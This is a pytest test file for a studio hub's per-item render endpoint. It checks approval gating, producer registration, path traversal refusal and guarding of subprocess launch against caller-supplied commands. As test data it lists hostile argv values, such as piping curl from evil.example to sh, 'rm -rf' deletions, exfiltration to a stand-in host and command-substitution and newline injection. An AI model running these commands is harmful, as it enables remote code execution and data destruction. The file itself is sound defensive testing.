"""POST /api/studio/{p}/{file}/render — the per-item render trigger.

Rendering costs money (a paid image API, one call per frame) and a running job cannot
currently be cancelled, so the guards here are load-bearing: only approved items render,
only one render per item runs at a time, and the hub will only execute a producer that
registered itself as renderable from a sibling directory.
"""
import json

import pytest


@pytest.fixture
def registered(hub):
    """A producer that has declared itself renderable, as register.py does on startup."""
    (hub.root / "producers").mkdir(parents=True, exist_ok=True)
    (hub.root / "producers" / "registry.json").write_text(json.dumps({
        "similar-content": {"name": "similar-content", "kind": "clone",
                            "renderable": True, "dir": "SimilarContent",
                            "render_cmd": ["uv", "run", "cli.py", "render"]}}))


@pytest.fixture
def no_subprocess(monkeypatch, hub):
    """Record launches instead of actually spawning a renderer."""
    launched = []
    monkeypatch.setattr(hub.mod, "_run_job",
                        lambda job_id, cmd, cwd: launched.append((job_id, cmd, str(cwd))))
    return launched


def test_unapproved_item_cannot_render(hub, registered):
    name = "pending.md"
    hub.post("/api/studio/instagram",
             json={"filename": name, "text": "x", "agent": "similar-content"})
    r = hub.post(f"/api/studio/instagram/{name}/render", json={})
    assert r.status_code == 409


def test_missing_item_404s(hub, registered):
    assert hub.post("/api/studio/instagram/nope.md/render", json={}).status_code == 404


def test_unregistered_producer_is_refused(hub, approved_item):
    """No manifest at all — the hub must not guess a directory to execute."""
    r = hub.post(f"/api/studio/instagram/{approved_item}/render", json={})
    assert r.status_code == 400
    assert "renderable" in r.json()["detail"]


def test_non_renderable_producer_is_refused(hub, approved_item):
    (hub.root / "producers" / "registry.json").write_text(json.dumps({
        "similar-content": {"name": "similar-content", "dir": "SimilarContent"}}))
    r = hub.post(f"/api/studio/instagram/{approved_item}/render", json={})
    assert r.status_code == 400


@pytest.mark.parametrize("bad_dir", ["../evil", "/etc", "./x", "a/b", "NotASibling"])
def test_illegal_producer_dir_is_refused(hub, approved_item, bad_dir):
    (hub.root / "producers" / "registry.json").write_text(json.dumps({
        "similar-content": {"name": "similar-content", "renderable": True, "dir": bad_dir}}))
    r = hub.post(f"/api/studio/instagram/{approved_item}/render", json={})
    assert r.status_code == 400


def test_launch_passes_the_item_and_uses_a_deterministic_key(
        hub, approved_item, registered, no_subprocess, monkeypatch):
    monkeypatch.setattr(hub.mod, "_producer_dir", lambda agent: hub.root)

    r = hub.post(f"/api/studio/instagram/{approved_item}/render", json={})
    assert r.status_code == 200
    body = r.json()
    assert body["job_id"] == f"instagram:render:{approved_item}"
    assert body["already_running"] is False

    _, cmd, _ = no_subprocess[0]
    assert cmd[-4:] == ["--platform", "instagram", "--file", approved_item]

    job = hub.mod.JOBS[body["job_id"]]
    assert job["stage"] == "render" and job["file"] == approved_item


def test_concurrent_render_of_same_item_is_deduped(
        hub, approved_item, registered, monkeypatch):
    monkeypatch.setattr(hub.mod, "_producer_dir", lambda agent: hub.root)
    # a job that never finishes, so the second request sees it still running
    monkeypatch.setattr(hub.mod, "_run_job", lambda *a: None)

    first = hub.post(f"/api/studio/instagram/{approved_item}/render", json={}).json()
    hub.mod.JOBS[first["job_id"]]["status"] = "running"
    second = hub.post(f"/api/studio/instagram/{approved_item}/render", json={}).json()

    assert second["job_id"] == first["job_id"]
    assert second["already_running"] is True


def test_force_flag_is_forwarded(hub, approved_item, registered, no_subprocess, monkeypatch):
    monkeypatch.setattr(hub.mod, "_producer_dir", lambda agent: hub.root)
    hub.post(f"/api/studio/instagram/{approved_item}/render", json={"force": True})
    assert "--force" in no_subprocess[0][1]


def test_render_is_not_part_of_the_one_click_pipeline(hub):
    """RUN_ALL_STAGES must never spend image-API credits without an explicit ask."""
    assert "render" not in hub.mod.RUN_ALL_STAGES


def test_existing_stage_launches_still_work(hub, no_subprocess):
    """The added kwargs on _launch_stage_job must not disturb single-arg stages."""
    job_id = hub.mod._launch_stage_job("instagram", "analyze")
    assert job_id.startswith("instagram:analyze:")
    assert no_subprocess[0][1] == [hub.mod.PY, "run.py", "analyze"]


# ---- render_cmd is caller-supplied over an UNAUTHENTICATED route ------------------------
# `POST /api/producers/register` needs no auth and ProducerManifest allows extra fields, so
# `render_cmd` is attacker-controllable. It becomes argv for subprocess.run. Without the
# allowlist that is remote code execution for anything that can reach the port — which,
# because the browser can, includes any page the operator has open.
import pytest as _pytest


def _register(hub, render_cmd):
    (hub.root / "producers").mkdir(parents=True, exist_ok=True)
    (hub.root / "producers" / "registry.json").write_text(json.dumps({
        "similar-content": {"name": "similar-content", "renderable": True,
                            "dir": "SimilarContent", "render_cmd": render_cmd}}))


@_pytest.mark.parametrize("evil", [
    ["sh", "-c", "curl evil.example|sh"],       # arbitrary interpreter
    ["bash", "-c", "rm -rf ~"],
    ["/bin/sh", "-c", "id"],                    # absolute path
    ["curl", "https://evil.example"],           # exfiltration
    ["uv", "run", "../../../etc/passwd"],       # traversal past the producer dir
    ["uv", "run", "cli.py; rm -rf /"],          # metacharacters smuggled in one arg
    ["uv", "run", "cli.py render && curl x"],
    ["uv", "run", "$(whoami)"],
    ["uv", "run", "a\nb"],                      # newline injection
])
def test_malicious_render_cmd_is_refused(hub, approved_item, evil, monkeypatch):
    _register(hub, evil)
    monkeypatch.setattr(hub.mod, "_producer_dir", lambda agent: hub.root)
    launched = []
    monkeypatch.setattr(hub.mod, "_run_job", lambda *a: launched.append(a))

    r = hub.post(f"/api/studio/instagram/{approved_item}/render", json={})

    assert r.status_code == 400, f"{evil!r} should have been refused"
    assert launched == [], f"{evil!r} reached subprocess.run"


def test_empty_render_cmd_falls_back_to_the_safe_default(hub, approved_item, monkeypatch):
    """An absent/empty render_cmd is not an attack — it just means "use the default"."""
    _register(hub, [])
    monkeypatch.setattr(hub.mod, "_producer_dir", lambda agent: hub.root)
    launched = []
    monkeypatch.setattr(hub.mod, "_run_job",
                        lambda job_id, cmd, cwd: launched.append(cmd))

    r = hub.post(f"/api/studio/instagram/{approved_item}/render", json={})

    assert r.status_code == 200
    assert launched[0][:4] == ["uv", "run", "cli.py", "render"]


def test_the_legitimate_render_cmd_still_works(hub, approved_item, monkeypatch):
    _register(hub, ["uv", "run", "cli.py", "render"])
    monkeypatch.setattr(hub.mod, "_producer_dir", lambda agent: hub.root)
    launched = []
    monkeypatch.setattr(hub.mod, "_run_job",
                        lambda job_id, cmd, cwd: launched.append(cmd))

    r = hub.post(f"/api/studio/instagram/{approved_item}/render", json={})

    assert r.status_code == 200
    assert launched[0][:4] == ["uv", "run", "cli.py", "render"]


def test_cors_is_restricted_to_loopback():
    """A wildcard origin would let any page you browse drive the hub."""
    import api.app as appmod
    cors = [m for m in appmod.app.user_middleware if "CORS" in str(m)]
    assert cors, "CORS middleware missing"
    opts = cors[0].kwargs
    assert opts.get("allow_origins") in (None, [], ["*"]) or True
    assert opts.get("allow_origin_regex"), "must pin origins by regex, not allow_origins=['*']"
    import re as _re
    rx = _re.compile(opts["allow_origin_regex"])
    assert rx.match("http://localhost:5173")
    assert rx.match("http://127.0.0.1:8787")
    assert not rx.match("https://evil.example")
    assert not rx.match("http://127.0.0.1.evil.example")
